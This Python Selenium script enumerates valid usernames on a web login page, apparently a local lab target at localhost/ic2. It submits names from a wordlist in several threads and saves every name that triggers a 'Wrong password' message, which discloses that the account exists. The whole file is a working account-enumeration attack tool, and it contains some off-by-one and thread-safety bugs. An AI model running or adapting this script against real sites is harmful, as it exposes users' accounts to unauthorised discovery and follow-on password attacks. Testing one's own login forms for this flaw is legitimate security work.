from selenium import webdriver
from selenium.webdriver.common.by import By
import numpy as np
import threading
import time

# user customizations
number_of_threads = 2
# wordlist = "wordlists/rockyou.txt"
wordlist = "wordlists/wordlist200usernamess.txt"

secret_usernames = []
threads = []
list = []

# enumerate usernames
def enumerate_web():
    global index_of_last_used_name 
    index_of_last_used_name = 0

    driver = create_driver()
    usernames = load_wordlist()

    while(index_of_last_used_name <= len(usernames)):
        username = usernames[index_of_last_used_name-1]
        driver.find_element('name', 'username').send_keys(username.lower())
        driver.find_element('name', 'verify').click()
        driver.implicitly_wait(0.1) 
        error = driver.find_element(By.ID, 'error').text
            
        # find a match with wordlist username 
        if error == "Wrong password":
            secret_usernames.append(username.lower())

            # write out to file found usernames
            with open('secret_usernames.txt', 'a') as file:
                file.write('%s\n' % username.lower())

        # prints out index of a checked username from wordlist 
        index_of_last_used_name += 1
        print(index_of_last_used_name)

    driver.quit()

# create browser instance
def create_driver():
    url = "http://localhost/ic2/"
    driver = webdriver.Firefox()
    driver.get(url)
    return driver

# load a wordlist
def load_wordlist():
    with open(wordlist, "r", errors='replace') as file:
        return file.read().splitlines() 

def start_threads():
    i = 0
    for i in range(0,number_of_threads):
        try:
            thread = threading.Thread(target=enumerate_web)
            list.append(thread)
            thread.start()
            time.sleep(1)
        except:
            print("Error: unable to start thread")

# erase output file
def setup():
    open('secret_usernames.txt', 'w').close()


setup()        
start_threads()
 

    